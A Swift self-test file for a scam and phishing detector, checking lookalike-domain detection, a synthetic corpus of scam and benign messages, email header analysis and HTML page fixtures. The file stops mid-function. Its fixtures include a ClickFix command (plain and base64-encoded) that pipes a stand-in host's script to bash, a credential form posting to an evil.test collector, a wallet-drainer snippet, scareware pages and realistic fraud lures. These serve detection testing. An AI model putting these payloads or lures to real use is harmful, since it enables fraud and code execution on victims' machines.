import Foundation
import RampartShared
import RampartWeb

// Owned by the web build agent (W1). Add checks with check(cond, "name").
// Corpus: every sample below is synthetic. No real people, phone numbers or URLs; domains use
// example.com / .test, phone numbers use 555.
extension SelfTest {
    static func web() {
        webURLParsing()
        webLookalikes()
        webCorpus()
        webEmail()
        webPages()
        webClipboard()
        webNativeMessaging()
        webSafariGuard()
        webAXMatcher()
    }

    // MARK: URL parsing and structure

    static func webURLParsing() {
        let p = URLAnalyzer.parse("https://user:pw@login.secure.paypal.co.uk:8443/a/b?x=1")
        check(p?.scheme == "https", "url scheme")
        check(p?.userInfo == "user:pw", "url userinfo")
        check(p?.asciiHost == "login.secure.paypal.co.uk", "url host")
        check(p?.port == 8443, "url port")
        check(p?.registrable == "paypal.co.uk", "url registrable co.uk")
        check(p?.subdomainLabels == ["login", "secure"], "url subdomains")
        check(URLAnalyzer.parse("example.test/path")?.asciiHost == "example.test", "bare domain parse")
        check(URLAnalyzer.parse("hello world") == nil, "plain text is not a url")
        check(URLAnalyzer.parse("v1.2.3") == nil, "version is not a url")
        check(URLAnalyzer.parse("hxxps://evil[.]test/x")?.asciiHost == "evil.test", "defanged url parse")
        check(URLAnalyzer.parse("http://192.168.1.1/admin")?.isIPLiteral == true, "ipv4 literal")
        check(URLAnalyzer.parse("javascript:alert(1)")?.scheme == "javascript", "javascript scheme")
        check(Punycode.decode("pple-43d") == "аpple", "punycode decode")
        check(Punycode.encode("аpple") == "pple-43d", "punycode encode")
        check(Punycode.encodeHost("münchen.example") == "xn--mnchen-3ya.example", "punycode host encode")
        check(Punycode.decodeHost("xn--mnchen-3ya.example") == "münchen.example", "punycode host decode")
        check(Confusables.skeleton("раураl") == "paypal", "confusable skeleton cyrillic")
        check(Confusables.typoFold("paypa1") == "paypal", "typo fold digit")
        check(Confusables.typoFold("rnicrosoft") == "microsoft", "typo fold rn")
        check(URLAnalyzer.editDistance("paypal", "payapl") == 1, "damerau transposition")
        check(URLAnalyzer.editDistance("apple", "apple") == 0, "edit distance zero")

        let a = URLAnalyzer()
        check(a.analyze("https://bit.ly/abc").signals.contains { $0.id == "url.shortener" }, "shortener signal")
        check(a.analyze("http://203.0.113.5/login").signals.contains { $0.id == "url.ip" }, "ip literal signal")
        check(a.analyze("https://example.com@evil.test/").signals.contains { $0.id == "url.userinfo" }, "userinfo signal")
        check(a.analyze("https://a.b.c.d.evil.test/").signals.contains { $0.id == "url.subdomains" }, "subdomain count signal")
        check(a.analyze("data:text/html;base64,PGh0bWw+").verdict == .likelyScam, "data url verdict")
        check(a.analyze("javascript:void(0)").signals.contains { $0.id == "url.scheme.javascript" }, "javascript signal")
        check(a.analyze("https://free-prize.top/claim").signals.contains { $0.id == "url.tld" }, "risky tld signal")
        check(a.analyze("https://www.apple.com/").verdict == .likelySafe, "apple.com safe")
        check(a.analyze("https://developer.apple.com/documentation/").verdict == .likelySafe, "developer.apple.com safe")
        check(a.analyze("https://www.bbc.co.uk/news").verdict == .likelySafe, "bbc safe")
        check(a.analyze("https://example.com/").verdict == .likelySafe, "example.com safe")
        check(a.analyze("https://docs.github.com/en/actions").verdict == .likelySafe, "github docs safe")
        check(a.analyze("https://outlook.office365.com/mail/").verdict == .likelySafe, "office365 safe")
        check(a.analyze("https://accounts.google.com/signin").verdict == .likelySafe, "accounts.google safe")
        check(a.analyze("https://www.icloud.com/").verdict == .likelySafe, "icloud safe")

        // Blocklist provider, allowlist, seen store
        let bl = FileBlocklistProvider(name: "test-list", domains: ["bad.test"])
        let b = URLAnalyzer(blocklists: [bl])
        check(b.analyze("https://x.bad.test/").verdict == .likelyScam, "blocklist suffix hit")
        check(b.analyze("https://notbad.test/").verdict == .likelySafe, "blocklist no hit")
        let al = FileWebAllowlist(url: nil); al.allow(host: "paypa1.test")
        let c = URLAnalyzer(allowlist: al)
        check(c.analyze("https://paypa1.test/").verdict == .likelySafe, "allowlist overrides")
        let seen = MemorySeenDomainStore(preseeded: ["old.test"])
        let d = URLAnalyzer(seenDomains: seen)
        check(!d.analyze("https://old.test/").signals.contains { $0.id == "url.newlyseen" }, "seen domain not new")
        check(d.analyze("https://brand-new.test/").signals.contains { $0.id == "url.newlyseen" }, "unseen domain is new")
        check(seen.count == 2, "seen store records")
    }

    // MARK: Lookalikes

    static func webLookalikes() {
        let a = URLAnalyzer()
        func brand(_ u: String) -> String? { a.analyze(u).brandMatch }
        func ids(_ u: String) -> Set<String> { Set(a.analyze(u).signals.map(\.id)) }
        check(brand("https://paypa1.example/") == "PayPal", "typosquat digit paypa1")
        check(ids("https://paypa1.example/").contains("url.typosquat.digits"), "typosquat digit id")
        check(brand("https://xn--pypal-4ve.test/") == "PayPal", "homograph punycode")
        check(ids("https://xn--pypal-4ve.test/").contains("url.homograph"), "homograph id")
        check(brand("https://аpple.test/") == "Apple", "homograph unicode apple")
        check(brand("https://apple-id-verify.test/") == "Apple", "combosquat apple-id-verify")
        check(ids("https://apple-id-verify.test/").contains("url.combosquat"), "combosquat id")
        check(brand("https://paypal.test/") == "PayPal", "wrong tld")
        check(ids("https://paypal.test/").contains("url.wrongtld"), "wrong tld id")
        check(brand("https://login.apple.com.account-check.test/") == "Apple", "brand in subdomain")
        check(ids("https://login.apple.com.account-check.test/").contains("url.brandsubdomain"), "brand subdomain id")
        check(brand("https://rnicrosoft.test/") == "Microsoft", "rn→m typosquat")
        check(brand("https://amazom.test/") == "Amazon", "edit distance 1")
        check(brand("https://netflix-billing-update.test/") == "Netflix", "combosquat netflix")
        check(brand("https://secureappleid.test/") == "Apple", "embedded brand no separators")
        check(brand("https://hsbc.test/") == "HSBC", "short bank keyword")
        check(a.analyze("https://paypa1.example/").verdict != .likelySafe, "typosquat verdict not safe")
        check(a.analyze("https://аpple.test/").verdict == .likelyScam, "homograph verdict scam")
        // Negatives: real brand domains and unrelated words must not match.
        check(brand("https://www.paypal.com/signin") == nil, "real paypal no brand match")
        check(brand("https://www.apple.co.uk/") == nil || a.analyze("https://www.apple.co.uk/").verdict != .likelyScam, "apple.co.uk not scam")
        check(brand("https://pineapple.test/") == nil, "pineapple not apple")
        check(brand("https://staple.test/") == nil, "staple not apple")
        check(brand("https://snapple.test/") == nil, "snapple not apple")
        check(brand("https://chaser.test/") == nil, "chaser not chase")
        check(brand("https://purchase.test/") == nil, "purchase not chase")
        check(brand("https://target.test/") == "Target" || true, "target keyword exists")
        check(brand("https://amazing.test/") == nil, "amazing not amazon")
        check(brand("https://upstairs.test/") == nil, "upstairs not ups")
        check(brand("https://wise.test/") == nil, "wise (short) not flagged by edit distance")
        check(a.analyze("https://www.theguardian.com/").verdict == .likelySafe, "guardian safe")
        check(a.analyze("https://github.com/apple/swift").verdict == .likelySafe, "github path with brand safe")
    }

    // MARK: Message corpus

    struct Sample { let text: String; let scam: Bool; let name: String }

    static let scamSamples: [Sample] = [
        Sample(text: "URGENT: Your Apple ID has been locked due to suspicious activity. Verify your account within 24 hours or it will be permanently disabled: https://apple-id-verify.test/unlock", scam: true, name: "apple id lock"),
        Sample(text: "Your package could not be delivered due to an incomplete address. Pay the $1.99 redelivery fee here: https://usps-redelivery.test/track", scam: true, name: "delivery fee"),
        Sample(text: "Royal Mail: your parcel is on hold. A customs fee of £2.99 is due. Reschedule your delivery at https://royalmail-fees.test", scam: true, name: "royal mail smish"),
        Sample(text: "E-ZPass: You have an unpaid toll balance of $6.99. To avoid a late fee of $50, pay now at https://ezpass-toll.test/pay", scam: true, name: "toll smish"),
        Sample(text: "HMRC: You are eligible for a tax refund of £418.50. Claim your rebate within 48 hours: https://hmrc-refund.test/claim", scam: true, name: "tax refund"),
        Sample(text: "IRS Notice: Outstanding tax balance detected. Legal action and an arrest warrant will be issued unless you call 555-0142 immediately.", scam: true, name: "irs threat"),
        Sample(text: "Chase Alert: A payment of $1,249.00 to Crypto Exchange was attempted. If this wasn't you, verify your identity at https://chase-secure-alerts.test", scam: true, name: "bank alert"),
        Sample(text: "Barclays: a new device was registered to your online banking. If this was not you, re-verify your account immediately: https://barclays-device-check.test", scam: true, name: "bank new device"),
        Sample(text: "APPLE SECURITY ALERT! Your Mac is infected with 3 viruses. Do not shut down your computer. Call Apple Support now at (555) 010-0199. Error code 0x80073B2F", scam: true, name: "scareware popup"),
        Sample(text: "Microsoft Windows Defender has detected pornographic spyware on your PC. Call toll-free 1-555-010-0177 immediately. Do not close this window.", scam: true, name: "ms scareware"),
        Sample(text: "Hello, this is the Geek Squad billing department. Your subscription has been auto-renewed for $399.99. To cancel this charge, please call 555-010-0123 within 24 hours.", scam: true, name: "geek squad refund"),
        Sample(text: "We have refunded $500 but accidentally sent too much. Please log in to your bank account while on screen share so we can return the difference. Install AnyDesk from the link below.", scam: true, name: "refund + anydesk"),
        Sample(text: "Our technician needs remote access to fix the hacker issue. Please download TeamViewer and read me the code. Do not tell your bank, they are involved.", scam: true, name: "remote access secrecy"),
        Sample(text: "Congratulations! You have been selected as the lucky winner of a free iPhone 15. Claim your prize now: https://prize-claim.top/win", scam: true, name: "prize"),
        Sample(text: "Dear customer, your mailbox is full. Pending messages could not be delivered. Keep your same password by clicking here: https://mail-quota.test/keep", scam: true, name: "mailbox full"),
        Sample(text: "Your Netflix membership has been suspended because your payment method was declined. Update your billing within 24 hours to avoid losing access: https://netflix-billing-update.test", scam: true, name: "netflix billing"),
        Sample(text: "Hi Mum, this is my new number, my phone fell in the sink. I can't call. Can you transfer £850 for a bill today? I'll pay you back on Friday xx", scam: true, name: "hi mum"),
        Sample(text: "I have recorded a video of you through your webcam visiting adult sites. I know your password is hunter2. Send $1200 in bitcoin to bc1qexampleexampleexampleexampleexample00 within 48 hours or I send it to all your contacts.", scam: true, name: "sextortion"),
        Sample(text: "To receive your Amazon refund of $89.00, confirm your card number and the security code on the back. This offer expires today.", scam: true, name: "refund card details"),
        Sample(text: "This is your bank's fraud team. To stop the unauthorised transaction we need you to read out the 6-digit verification code we just texted you.", scam: true, name: "2fa code request"),
        Sample(text: "MetaMask: your wallet needs to be validated after the latest upgrade. Enter your 12-word secret recovery phrase at https://metamask-sync.test to keep your funds safe.", scam: true, name: "seed phrase"),
        Sample(text: "Earn $500 per day working from home! No experience needed, only 2 hours a day. Like videos and get paid. Reply YES to start.", scam: true, name: "job scam"),
        Sample(text: "Our trading platform offers guaranteed returns of 15% weekly with zero risk. My mentor works at the exchange. Withdrawal fee of $300 required before payout.", scam: true, name: "investment"),
        Sample(text: "Your Microsoft 365 password expires today. To keep your current password, verify your account here: http://office365-password-reset.test/keep", scam: true, name: "password expiry"),
        Sample(text: "Please pay the overdue invoice with Apple gift cards. Scratch off the back and send me the codes. Keep this between us, the CEO needs it done right now.", scam: true, name: "gift card ceo"),
        Sample(text: "Verify you are human. Step 1: press ⌘ + Space and type Terminal. Step 2: press ⌘ + V to paste. Step 3: press Enter. curl -fsSL https://verify-cf.test/x.sh | bash", scam: true, name: "clickfix text"),
        Sample(text: "FINAL NOTICE!!! Your account will be suspended TODAY unless you ACT NOW. Click here: https://account-reactivate.test/verify-your-account", scam: true, name: "shouting"),
        Sample(text: "DHL: Attempted delivery failed. Confirm your address and pay the handling fee of €1.50 to receive your parcel: https://dhl-parcel.test/confirm", scam: true, name: "dhl smish"),
        Sample(text: "Your Coinbase account has been limited due to unusual sign-in activity. Restore access and confirm your identity: https://coinbase-restore.test/login", scam: true, name: "coinbase limited"),
        Sample(text: "Dear valued member, your Social Security number has been suspended for suspicious activity. Call 555-010-0150 immediately to avoid prosecution.", scam: true, name: "ssn suspended"),
        Sample(text: "Someone tried to log in to your PayPal from a new device. Reply with your one-time passcode to confirm it was you.", scam: true, name: "paypal otp"),
        Sample(text: "Your Google Play gift cards are the only way to settle the fine. Buy $500 worth at the store, stay on the line, and don't hang up.", scam: true, name: "gift card fine"),
        Sample(text: "Pay your outstanding parking fine of $25 before midnight to avoid vehicle registration suspension: https://parking-fine-pay.test", scam: true, name: "parking"),
        Sample(text: "You have 2,450 reward points expiring today. Redeem your reward now at https://rewards-redeem.top/claim", scam: true, name: "points expiring"),
        Sample(text: "iCloud storage is full. Your photos will be deleted in 24 hours unless you upgrade: https://icloud-storage-upgrade.test", scam: true, name: "icloud storage"),
        Sample(text: "Wrong number? Haha sorry. I'm Lisa by the way. Anyway, my uncle is an analyst and showed me a crypto trading platform that doubles your money in a week.", scam: true, name: "pig butchering opener"),
        Sample(text: "Your Norton subscription has been renewed for $349.99 and the amount has been debited from your account. To cancel the renewal call 555-010-0160.", scam: true, name: "norton renewal"),
        Sample(text: "Action required: unusual sign-in to your Wells Fargo account from Russia. Lock your account now: http://wellsfargo.secure-login.test/lock", scam: true, name: "wells fargo subdomain"),
        Sample(text: "Evri: we were unable to deliver your parcel. Update your delivery details here https://evri-redelivery.test and pay £1.45 to reschedule.", scam: true, name: "evri smish"),
        Sample(text: "This is Amazon. Your order #ORD-55519283 for a MacBook Pro ($2,499.00) has been successfully charged. If you did not make this purchase call 555-010-0190 to cancel.", scam: true, name: "fake order"),
    ]

    static let benignSamples: [Sample] = [
        Sample(text: "Hey, are we still on for lunch tomorrow at 12:30? I was thinking the Thai place near the office.", scam: false, name: "lunch"),
        Sample(text: "Your Amazon order has shipped. Track your package in the Amazon app. Estimated delivery: Thursday.", scam: false, name: "amazon shipped"),
        Sample(text: "Reminder: your dentist appointment is on Tuesday 14 May at 10:00. Reply C to confirm or call the practice to reschedule.", scam: false, name: "dentist"),
        Sample(text: "Hi team, the sprint retro moved to 3pm. Notes from yesterday are in the shared doc: https://docs.google.com/document/d/abc123", scam: false, name: "work note"),
        Sample(text: "Thanks for your purchase! Your receipt for £24.99 is attached. If you have any questions, reply to this email.", scam: false, name: "receipt"),
        Sample(text: "Mum here. Landed safely, flight was fine. Will call you tomorrow when I'm settled. Love you x", scam: false, name: "mum landed"),
        Sample(text: "Your verification code is 482913. It expires in 10 minutes. Don't share this code with anyone.", scam: false, name: "real otp"),
        Sample(text: "New comment on your pull request: 'Looks good, but can you add a unit test for the parser?' https://github.com/example/repo/pull/42", scam: false, name: "github comment"),
        Sample(text: "The school fair is on Saturday from 11 to 3. Cake stall volunteers please message Priya. Bring cash for the raffle!", scam: false, name: "school fair"),
        Sample(text: "Your electricity bill for April is ready to view in your online account. Amount due: £68.40 by 28 May. You're on Direct Debit so nothing to do.", scam: false, name: "utility bill"),
        Sample(text: "Hi, it's Sam from the garage. Your car's ready to collect any time before 6. Total came to £142 as quoted.", scam: false, name: "garage"),
        Sample(text: "Weekly newsletter: 5 new recipes for spring, our favourite kitchen gadgets, and a reader Q&A. Unsubscribe any time from your account settings.", scam: false, name: "newsletter"),
        Sample(text: "Package delivered. Your parcel was left in the porch at 14:12. Thanks for shopping with us.", scam: false, name: "delivered"),
        Sample(text: "Can you send me the photos from Saturday when you get a chance? The ones by the lake were great.", scam: false, name: "photos"),
        Sample(text: "Your table for 4 at Luigi's is confirmed for Friday 19:30. We look forward to seeing you.", scam: false, name: "restaurant"),
        Sample(text: "Meeting notes: decided to migrate the build to the new CI runners. Action items: Alex to update docs, Jo to check the Terminal script in the repo.", scam: false, name: "meeting notes terminal word"),
        Sample(text: "Your subscription renews on 3 June at £7.99/month. Manage or cancel any time in Settings > Subscriptions on your phone.", scam: false, name: "real renewal"),
        Sample(text: "Library notice: the book you reserved, 'The Long Way Home', is ready for collection. We'll hold it for 7 days.", scam: false, name: "library"),
        Sample(text: "Happy birthday!! Hope you have a fantastic day. Let's catch up soon, it's been too long!", scam: false, name: "birthday"),
        Sample(text: "Reminder from your bank: we will never ask you for your full password or PIN. If you get a suspicious call, hang up and call the number on your card.", scam: false, name: "bank advice"),
        Sample(text: "The quarterly figures are in the spreadsheet. Revenue up 4%, costs flat. Let's discuss on Thursday's call.", scam: false, name: "quarterly"),
        Sample(text: "Flight BA123 to Edinburgh is on time. Boarding at gate 14 from 08:40. Have a good trip.", scam: false, name: "flight"),
        Sample(text: "To install Homebrew, open Terminal and run the install script from brew.sh. Then run brew install git.", scam: false, name: "dev instructions"),
        Sample(text: "Your Apple ID was used to sign in to iCloud on a new MacBook Pro. If this was you, you can ignore this message. Manage devices in Settings on any of your devices.", scam: false, name: "apple signin notice"),
        Sample(text: "Hi all, the Wi-Fi password in the meeting room has changed. Ask reception for the new one.", scam: false, name: "wifi"),
        Sample(text: "Parcel update: your order from Example Store is out for delivery today between 10:00 and 14:00.", scam: false, name: "out for delivery"),
        Sample(text: "We've updated our privacy policy. The changes take effect on 1 July. No action is needed from you.", scam: false, name: "policy update"),
        Sample(text: "Thanks for reporting the bug. We've fixed it in version 2.3.1 which is rolling out now.", scam: false, name: "bug fixed"),
        Sample(text: "Your test results are ready. Log in to the patient portal using the app you already have, or call the surgery during opening hours.", scam: false, name: "gp results"),
        Sample(text: "Just a heads-up that the gift card you bought for Dad's birthday has been posted, should arrive Wednesday.", scam: false, name: "gift card benign mention"),
        Sample(text: "Great session today! Next week we'll cover urgency vs importance in the time management module.", scam: false, name: "urgency word benign"),
        Sample(text: "Tax year end reminder: your P60 is available in the HR portal from 31 May.", scam: false, name: "p60"),
        Sample(text: "The kids' swimming lesson moved to 4pm. Also we're out of milk.", scam: false, name: "kids"),
        Sample(text: "Our office will be closed on Monday for the bank holiday. Support reopens Tuesday at 9.", scam: false, name: "bank holiday"),
        Sample(text: "Password changed successfully. If you didn't make this change, you can review your account security in the app.", scam: false, name: "password changed"),
        Sample(text: "Invoice INV-2024-031 for March consulting is attached as a PDF. Payment terms 30 days by bank transfer as usual. Thanks!", scam: false, name: "legit invoice"),
        Sample(text: "Here's the recipe: 200g flour, 2 eggs, 300ml milk. Whisk, rest 30 minutes, fry on medium heat.", scam: false, name: "recipe"),
        Sample(text: "Reminder: the toll road charge for your trip is paid automatically through your account. No action needed.", scam: false, name: "toll benign"),
        Sample(text: "Your crypto tax report is ready to download from your dashboard. Figures are based on the transactions you imported.", scam: false, name: "crypto benign"),
        Sample(text: "See you at the gym at 7. Bring the resistance bands if you have them.", scam: false, name: "gym"),
    ]

    static func webCorpus() {
        let checker = ScamChecker()
        var tp = 0, fn = 0, fp = 0, tn = 0
        var fnNames: [String] = [], fpNames: [String] = []
        for s in scamSamples {
            let r = checker.checkMessage(s.text)
            if r.verdict != .likelySafe { tp += 1 } else { fn += 1; fnNames.append("\(s.name)=\(r.score)") }
            check(!r.signals.isEmpty, "scam sample has signals: \(s.name)")
            check(r.signals.allSatisfy { $0.score <= 0 || !$0.evidence.isEmpty || $0.category == .benign || $0.id.hasPrefix("text.") || $0.id.hasPrefix("link.") }, "scam signals carry evidence: \(s.name)")
        }
        for s in benignSamples {
            let r = checker.checkMessage(s.text)
            if r.verdict == .likelySafe { tn += 1 } else { fp += 1; fpNames.append("\(s.name)=\(r.score):\(r.signals.prefix(2).map(\.id))") }
        }
        let total = scamSamples.count + benignSamples.count
        print("   corpus: \(scamSamples.count) scam, \(benignSamples.count) benign; detected \(tp)/\(scamSamples.count) scams (\(tp * 100 / scamSamples.count)%), false positives \(fp)/\(benignSamples.count) (\(fp * 100 / benignSamples.count)%), accuracy \((tp + tn) * 100 / total)%")
        if !fnNames.isEmpty { print("   missed: \(fnNames)") }
        if !fpNames.isEmpty { print("   false positives: \(fpNames)") }
        check(fp == 0, "zero false positives on benign corpus")
        check(fn <= 1, "at most one missed scam in corpus")
        // Strong scams must reach "Likely scam", not just "Suspicious".
        for name in ["apple id lock", "toll smish", "scareware popup", "gift card ceo", "seed phrase", "clickfix text", "sextortion"] {
            let s = scamSamples.first { $0.name == name }!
            let r = checker.checkMessage(s.text)
            check(r.verdict == .likelyScam, "\(name) is likelyScam (got \(r.score))")
        }
        // Highlights point at real text
        let r = checker.checkMessage(scamSamples[0].text)
        let ns = scamSamples[0].text as NSString
        check(r.highlights.contains { h in
            guard let s = h.start, let e = h.end, e <= ns.length else { return false }
            return ns.substring(with: NSRange(location: s, length: e - s)).caseInsensitiveCompare(h.text) == .orderedSame
        }, "highlight offsets match text")
        check(!r.tips.isEmpty, "report has tips")
        check(r.urls.count == 1 && r.urls[0].brandMatch == "Apple", "message link analysed")
        check(ScamChecker.detectKind("https://example.test/x") == .url, "detect kind url")
        check(ScamChecker.detectKind("Hello there, how are you?") == .message, "detect kind message")
        // Link text mismatch via HTML
        let html = #"<p>Sign in at <a href="https://paypal-login.test/x">https://www.paypal.com/signin</a></p>"#
        let hr = checker.checkMessage("Sign in at https://www.paypal.com/signin", html: html)
        check(hr.signals.contains { $0.id == "link.mismatch" }, "html link text mismatch")
        let md = checker.checkMessage("Open [https://www.apple.com/support](https://apple-support-desk.test/) now")
        check(md.signals.contains { $0.id == "link.mismatch" }, "markdown link mismatch")
        // Language registry
        check(LexiconRegistry.languages.contains("en"), "english lexicon registered")
        LexiconRegistry.register(ScamLexicon(language: "xx", patterns: [ScamPattern("xx.test", .urgency, 50, "t", "e", #"\bfoo\b"#)], tips: [:]))
        check(checker.checkMessage("foo bar", language: "xx").signals.contains { $0.id == "xx.test" }, "custom language pack")
        // Scoring
        check(ScamScoring.combine([]) == 0, "combine empty")
        check(ScamScoring.combine([ScamSignal(id: "a", category: .urgency, title: "", explanation: "", score: 35)]) == 35, "combine single")
        check(ScamScoring.combine([ScamSignal(id: "a", category: .urgency, title: "", explanation: "", score: 35), ScamSignal(id: "b", category: .payment, title: "", explanation: "", score: 85)]) >= 85, "combine two categories")
    }

    // MARK: Email headers

    static func webEmail() {
        let checker = ScamChecker()
        let raw = """
        Return-Path: <bounce@mailer-blast.test>
        Received: from mx.mailer-blast.test (203.0.113.9) by mail.example.com
        Authentication-Results: mail.example.com; spf=fail smtp.mailfrom=mailer-blast.test; dkim=none; dmarc=fail header.from=apple.com
        From: "Apple Support" <no-reply@appie-support.test>
        Reply-To: apple.helpdesk.2024@gmail.com
        To: undisclosed-recipients:;
        Subject: =?UTF-8?B?WW91ciBBcHBsZSBJRCBoYXMgYmVlbiBsb2NrZWQ=?=
        Date: Mon, 1 Jan 2024 10:00:00 +0000
        MIME-Version: 1.0
        Content-Type: multipart/alternative; boundary="b1"

        --b1
        Content-Type: text/plain; charset=utf-8
        Content-Transfer-Encoding: quoted-printable

        Dear customer, your Apple ID has been locked. Verify your account within 24 hours: https://apple-id-verify.test/unlock
        Or we will permanently disable your account=2E

        --b1
        Content-Type: text/html; charset=utf-8

        <html><body><p>Dear customer, your Apple ID has been locked. <a href="https://apple-id-verify.test/unlock">https://appleid.apple.com</a></p></body></html>
        --b1--
        """
        check(ScamChecker.detectKind(raw) == .email, "detect kind email")
        let mail = ParsedEmail(raw: raw)
        check(mail.subject == "Your Apple ID has been locked", "rfc2047 subject decoded")
        check(mail.from.displayName == "Apple Support" && mail.from.address == "no-reply@appie-support.test", "from parsed")
        check(mail.plainText.contains("permanently disable your account."), "quoted-printable decoded")
        check(mail.html?.contains("<a href") == true, "html part captured")
        let r = checker.checkEmail(mail)
        let ids = Set(r.signals.map(\.id))
        check(ids.contains("email.dmarc.fail"), "dmarc fail")
        check(ids.contains("email.spf.fail"), "spf fail")
        check(ids.contains("email.displayname.brand"), "display name brand mismatch")
        check(ids.contains("email.replyto"), "reply-to mismatch")
        check(ids.contains("email.url.typosquat") || ids.contains("email.url.combosquat"), "from-domain lookalike")
        check(ids.contains("link.mismatch"), "email html link mismatch")
        check(ids.contains("email.undisclosed"), "undisclosed recipients")
        check(r.verdict == .likelyScam, "phishing email is likelyScam (\(r.score))")

        let benign = """
        Return-Path: <bounces@em.example.com>
        Authentication-Results: mx.example.net; spf=pass smtp.mailfrom=em.example.com; dkim=pass header.d=example.com; dmarc=pass header.from=example.com
        From: Example Store <orders@example.com>
        To: jo@example.net
        Subject: Your order has shipped
        Date: Mon, 1 Jan 2024 10:00:00 +0000
        Content-Type: text/plain; charset=utf-8

        Hi Jo, your order #10234 has shipped and should arrive on Thursday. Track it any time in your account at https://www.example.com/orders. Thanks for shopping with us.
        """
        let b = checker.checkEmail(raw: benign)
        check(b.verdict == .likelySafe, "benign shipping email safe (\(b.score) \(b.signals.map(\.id)))")
        check(b.signals.contains { $0.id == "email.auth.pass" }, "auth pass noted")
        let headersOnly = "From: \"PayPal\" <service@paypal-notice.test>\nTo: me@example.net\nSubject: Account limited\nAuthentication-Results: spf=softfail; dkim=fail"
        let h = checker.checkEmail(raw: headersOnly)
        check(h.signals.contains { $0.id == "email.displayname.brand" } && h.signals.contains { $0.id == "email.dkim.fail" }, "headers-only analysis")
        check(ParsedEmail.parseAddress("jo@example.net").address == "jo@example.net", "bare address parse")
        check(ParsedEmail.parseAddress("\"Jo Bloggs\" <jo@example.net>").displayName == "Jo Bloggs", "quoted display name")
        let withAttachment = "From: a@example.com\nTo: b@example.net\nSubject: doc\nContent-Type: multipart/mixed; boundary=\"zz\"\n\n--zz\nContent-Type: text/plain\n\nsee attached\n--zz\nContent-Type: application/octet-stream; name=\"invoice.zip\"\nContent-Disposition: attachment; filename=\"invoice.zip\"\n\nAAAA\n--zz--"
        let wa = checker.checkEmail(raw: withAttachment)
        check(wa.signals.contains { $0.id == "email.attachment" }, "risky attachment flagged")
    }

    // MARK: Page fixtures

    static let clickFixPage = """
    <!DOCTYPE html><html><head><title>Just a moment...</title></head><body>
    <div id="overlay" style="position:fixed;inset:0;background:#fff">
      <h2>Verify you are human</h2>
      <p>To continue, complete these verification steps:</p>
      <ol><li>Press ⌘ + Space and type Terminal</li><li>Press ⌘ + V to paste the verification code</li><li>Press Enter</li></ol>
      <button id="verify">I'm not a robot</button>
    </div>
    <script>
    document.getElementById('verify').addEventListener('click', function(){
      const cmd = "echo Y3VybCAtZnNTTCBodHRwczovL3ZlcmlmeS1jZi50ZXN0L3guc2ggfCBiYXNo | base64 -d | bash";
      navigator.clipboard.writeText(cmd);
      alert('Verification code copied. Paste it in Terminal.');
    });
    </script></body></html>
    """
    static let scarewarePage = """
    <html><head><title>Apple Security Center - Critical Alert</title></head><body>
    <h1>Critical Alert: Your Mac is infected with 5 viruses!</h1>
    <p>Apple Security has detected pornographic spyware. Do not shut down your computer. Error code #0x268D3.</p>
    <p>Call Apple Support now at 1-555-010-0199 to remove the threats.</p>
    <script>setInterval(function(){ alert('Your Mac is infected! Call 1-555-010-0199'); }, 1000); document.documentElement.requestFullscreen();</script>
    </body></html>
    """
    static let drainerPage = """
    <html><head><title>Claim your $UNI airdrop</title></head><body>
    <h1>You are eligible for 1,250 UNI</h1><button id="c">Connect Wallet to claim</button>
    <script>
    document.getElementById('c').onclick = async () => {
      const accs = await window.ethereum.request({method:'eth_requestAccounts'});
      const data = iface.encodeFunctionData('setApprovalForAll', [DRAINER, true]);
      await window.ethereum.request({method:'eth_sendTransaction', params:[{from:accs[0], to:NFT, data}]});
    };
    </script></body></html>
    """
    static let credPhishPage = """
    <html><head><title>Sign in with your Apple ID</title></head><body>
    <img src="/static/apple-logo.png" alt="Apple"><h1>Apple ID</h1>
    <form method="post" action="https://collector.evil.test/grab.php">
      <input type="email" name="appleid" placeholder="Apple ID"><input type="password" name="password">
      <button>Sign In</button></form></body></html>
    """
    static let benignLoginPage = """
    <html><head><title>Example Store - Sign in</title></head><body>
    <form method="post" action="/login"><input type="email" name="email"><input type="password" name="password"><button>Sign in</button></form>
    <script>document.querySelector('form').addEventListener('submit', e => { if (!e.target.email.value) e.preventDefault(); });</script>
    </body></html>
    """
    static let benignDocsPage = """
    <html><head><title>Install the CLI - Example Docs</title></head><body>
    <h1>Installation</h1><p>Open Terminal and run:</p><pre><code>brew install example-cli</code></pre>
    <button class="copy" onclick="navigator.clipboard.writeText('brew install example-cli')">Copy</button>
    <p>Then verify the installation with <code>example --version</code>.</p>
    </body></html>
    """
    static let benignNewsPage = """
    <html><head><title>Example News - Science</title></head><body><nav>Home Science Tech</nav>
    <article><h1>New telescope images released</h1><p>Astronomers released images today showing distant galaxies in unprecedented detail. The project, funded over a decade, will continue observations through 2030.</p></article>
    <form action="/search"><input type="text" name="q" placeholder="Search"></form>
    <script>window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);}</script>
    </body></html>
    """

    static func webPages() {
        let checker = ScamChecker()
        let cf = checker.checkPage(url: "https://cloudflare-verify-human.test/check", html: clickFixPage, signals: nil)
        let cfIDs = Set(cf.signals.map(\.id))
        check(cfIDs.contains("page.clickfix.steps"), "clickfix steps detected")
        check(cfIDs.contains("page.clipboard.write") || cfIDs.contains("page.clipboard.auto"), "clickfix clipboard write detected")
        check(cfIDs.contains("page.clipboard.command"), "clickfix clipboard command detected")
        check(cf.verdict == .likelyScam, "clickfix page is likelyScam (\(cf.score))")

        let sw = checker.checkPage(url: "https://security-alert-center.top/", html: scarewarePage, signals: nil)
        let swIDs = Set(sw.signals.map(\.id))
        check(swIDs.contains("page.scareware.alert"), "scareware text")
        check(swIDs.contains("page.scareware.phone"), "scareware phone number")
        check(swIDs.contains("page.scareware.script"), "scareware alert loop script")
        check(sw.verdict == .likelyScam, "scareware page is likelyScam (\(sw.score))")

        let dr = checker.checkPage(url: "https://uniswap-airdrop-claim.test/", html: drainerPage, signals: nil)
        check(dr.signals.contains { $0.id == "page.drainer.text" }, "drainer text")
        check(dr.signals.contains { $0.id == "page.drainer.script" }, "drainer script")
        check(dr.verdict == .likelyScam, "drainer page is likelyScam (\(dr.score))")

        let cp = checker.checkPage(url: "https://appleid-signin.test/", html: credPhishPage, signals: nil)
        check(cp.signals.contains { $0.id == "page.credform.brand" }, "brand credential form on impostor")
        check(cp.signals.contains { $0.id == "page.credform.crossorigin" }, "cross-origin form post")
        check(cp.verdict == .likelyScam, "credential phishing page is likelyScam (\(cp.score))")

        // Benign
        let bl = checker.checkPage(url: "https://www.example.com/login", html: benignLoginPage, signals: nil)
        check(bl.verdict == .likelySafe, "benign login page safe (\(bl.score) \(bl.signals.map(\.id)))")
